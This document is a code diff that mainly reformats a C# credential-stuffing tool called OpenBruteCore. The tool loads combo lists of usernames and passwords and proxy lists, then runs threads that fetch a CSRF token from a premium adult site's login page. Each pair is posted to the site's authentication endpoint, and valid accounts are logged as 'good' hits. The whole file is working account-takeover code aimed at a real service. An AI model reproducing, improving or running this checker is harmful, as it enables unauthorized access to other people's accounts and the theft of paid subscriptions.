@@ -1,23 +1,22 @@
-﻿using Leaf.xNet;
-using System;
+﻿using System;
 using System.IO;
 using System.Security.Authentication;
 using System.Text.RegularExpressions;
 using System.Threading;
 using System.Windows.Forms;
+using Leaf.xNet;
 
 namespace OpenBruteCore
 {
-    public class AllMechanic
+    public static class AllMechanic
     {
-
         private static readonly object _accLock = new object();
         private static readonly object ResultLock = new object();
+
         public static void LoadSource()
         {
             try
             {
-
                 var FileDialog = new OpenFileDialog
                 {
                     Filter = "Source (*.txt)|*.txt",
@@ -26,17 +25,17 @@ namespace OpenBruteCore
                 if (FileDialog.ShowDialog() == DialogResult.OK)
                 {
                     GlobalList.sourceList.Clear();
-                    foreach (var file in FileDialog.FileNames)
-                    {
-                        GlobalList.sourceList.AddRange(File.ReadAllLines(file));
-                    }
+                    foreach (var file in FileDialog.FileNames) GlobalList.sourceList.AddRange(File.ReadAllLines(file));
+
                     GlobalList.frm.lbSource.Text = GlobalList.sourceList.Count.ToString();
                 }
+
                 FileDialog.Dispose();
             }
             catch (Exception ex)
             {
-                MessageBox.Show(ex.ToString(), "Error with loading source file !", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                MessageBox.Show(ex.ToString(), "Error with loading source file !", MessageBoxButtons.OK,
+                    MessageBoxIcon.Error);
             }
         }
 
@@ -47,19 +46,21 @@ namespace OpenBruteCore
                 var FileDialog = new OpenFileDialog
                 {
                     Filter = "Proxy (*.txt)|*.txt"
-                }; if (FileDialog.ShowDialog() == DialogResult.OK)
+                };
+                if (FileDialog.ShowDialog() == DialogResult.OK)
                 {
                     GlobalList.ProxyList.Clear();
                     GlobalList.ProxyList.AddRange(File.ReadAllLines(FileDialog.FileName));
                     GlobalList.frm.lbProxy.Text = GlobalList.ProxyList.Count.ToString();
                 }
+
                 FileDialog.Dispose();
             }
             catch (Exception ex)
             {
-                MessageBox.Show(ex.ToString(), "Error with loading proxy file !", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                MessageBox.Show(ex.ToString(), "Error with loading proxy file !", MessageBoxButtons.OK,
+                    MessageBoxIcon.Error);
             }
-
         }
 
         public static void RefreshProxy()
@@ -69,19 +70,15 @@ namespace OpenBruteCore
                 try
                 {
                     req.AllowAutoRedirect = false;
-                    string list = req.Get(GlobalList.proxyUrl).ToString();
-                    string[] Proxies = list.Split(new char[] { '\n' }, StringSplitOptions.RemoveEmptyEntries);
+                    var list = req.Get(GlobalList.proxyUrl).ToString();
+                    var Proxies = list.Split(new[] {'\n'}, StringSplitOptions.RemoveEmptyEntries);
                     GlobalList.ProxyList.Clear();
-                    foreach (string value in Proxies)
-                    {
-                        GlobalList.ProxyList.Add(value.Trim());
-                    }
+                    foreach (var value in Proxies) GlobalList.ProxyList.Add(value.Trim());
                 }
                 catch
                 {
                     RefreshProxy();
                 }
-
             }
         }
 
@@ -89,19 +86,20 @@ namespace OpenBruteCore
         {
             if (GlobalList.ProxyList.Count == 0)
             {
-                MessageBox.Show("Proxy list is clear! Load proxies!", "Error at start", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                MessageBox.Show("Proxy list is clear! Load proxies!", "Error at start", MessageBoxButtons.OK,
+                    MessageBoxIcon.Error);
             }
             else if (GlobalList.sourceList.Count == 0)
             {
-                MessageBox.Show("Source list is clear! Load source!", "Error at start", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                MessageBox.Show("Source list is clear! Load source!", "Error at start", MessageBoxButtons.OK,
+                    MessageBoxIcon.Error);
             }
             else
             {
                 GlobalList.worck = true;
                 GlobalList.threadList.Clear();
-                for (int thrcount = 0; thrcount < GlobalList.thCount; thrcount++)
+                for (var thrcount = 0; thrcount < GlobalList.thCount; thrcount++)
                 {
-
                     var th = new Thread(MainWorcher)
                     {
                         IsBackground = false,
@@ -110,24 +108,19 @@ namespace OpenBruteCore
                     GlobalList.threadList.Add(th);
                     th.Start();
                 }
-
             }
-
-
         }
-
 
 
         private static void MainWorcher()
         {
             while (GlobalList.worck)
-            {
                 try
                 {
-                    string acc = string.Empty;
-                    string login = string.Empty;
-                    string pass = string.Empty;
-                    lock (AllMechanic._accLock)
+                    var acc = string.Empty;
+                    var login = string.Empty;
+                    var pass = string.Empty;
+                    lock (_accLock)
                     {
                         if (GlobalList.sourceList.Count > 0)
                         {
@@ -138,33 +131,32 @@ namespace OpenBruteCore
                         {
                             break;
                         }
+
                         if (string.IsNullOrEmpty(acc))
                         {
                             Thread.Sleep(900);
                             continue;
                         }
+
                         if (acc.Contains(";"))
                         {
                             login = acc.Split(';')[0];
                             pass = acc.Split(';')[1];
                         }
+
                         if (acc.Contains(":"))
                         {
                             login = acc.Split(':')[0];
                             pass = acc.Split(':')[1];
                         }
-
                     }
+
                     Checker(login, pass);
                 }
                 catch
                 {
-                    continue;
                 }
-            }
-
         }
-
 
 
         private static void DataResult(string result, string acc)
@@ -226,14 +218,11 @@ namespace OpenBruteCore
 
         public static void Checker(string login, string pass)
         {
-
             using (var request = new HttpRequest())
             {
                 try
                 {
-
-
-                    string ip = Helper.GetProxy();
+                    var ip = Helper.GetProxy();
 
                     request.Cookies = new CookieStorage();
                     if (GlobalList.proxyType == "HTTPS")
@@ -247,11 +236,9 @@ namespace OpenBruteCore
 
 
                     //CSRF
-                    string token = request.Get("https://rt.pornhubpremium.com/premium/login").ToString();
-                    Match match = Regex.Match(token, "token\" id=\"token\" value=\"(.*)\"");
-                    string csrf = match.Success ? match.Groups[1].Value : "Не найдено";
-
-
+                    var token = request.Get("https://rt.pornhubpremium.com/premium/login").ToString();
+                    var match = Regex.Match(token, "token\" id=\"token\" value=\"(.*)\"");
+                    var csrf = match.Success ? match.Groups[1].Value : "Не найдено";
 
 
                     request.SslProtocols = SslProtocols.Tls | SslProtocols.Tls12 | SslProtocols.Tls11;
@@ -262,30 +249,23 @@ namespace OpenBruteCore
                     request.KeepAlive = true;
 
 
-                    string PostData = "username=" + login + "&password=" + pass + "&token=" + csrf + "&redirect=&from=pc_premium_login&segment=straight";
+                    var PostData = "username=" + login + "&password=" + pass + "&token=" + csrf +
+                                   "&redirect=&from=pc_premium_login&segment=straight";
 
                     //string json = "{\"username\":\""+login+"\",\"password\":\""+pass+"\",\"remember_me\":false,\"plid\":1,\"API_HOST\":\"godaddy.com\"}";
-                    string content = request.Post("https://rt.pornhubpremium.com/front/authenticate", PostData, "application/x-www-form-urlencoded").ToString();
+                    var content = request.Post("https://rt.pornhubpremium.com/front/authenticate", PostData,
+                        "application/x-www-form-urlencoded").ToString();
 
                     //metroTextBox2.Text = content;
 
                     if (content.Contains("success\":\"0"))
-                    {
                         DataResult("bad", login + ":" + pass);
-                    }
                     else if (content.Contains("success\":\"1"))
-                    {
                         DataResult("good", "+++++++++++++++++\r\n" + login + ":" + pass + "\r\n+++++++++++++++++\r\n");
-                    }
                     else if (content.Contains("<html><head><script type=\"text/javascript\">"))
-                    {
                         DataResult("bad", login + ":" + pass);
-                    }
                     else
-                    {
-                        DataResult("projecterror", login + ":" + pass + "{" + request.Response.ToString() + "}");
-                    }
-
+                        DataResult("projecterror", login + ":" + pass + "{" + request.Response + "}");
                 }
                 catch (HttpException)
                 {
@@ -294,28 +274,21 @@ namespace OpenBruteCore
 
                 catch (Exception ex)
                 {
-
                     DataResult("corerror", login + ":" + pass + "{" + ex.Message + "}");
                     // MessageBox.Show(ex.ToString());
                 }
                 finally
                 {
-
                     request?.Dispose();
                 }
             }
-
         }
 
 
         public static void StopWork()
         {
             GlobalList.workStatus = "nothing";
-            foreach (Thread thread in GlobalList.threadList)
-            {
-                thread.Abort();
-            }
-
+            foreach (var thread in GlobalList.threadList) thread.Abort();
         }
     }
 }
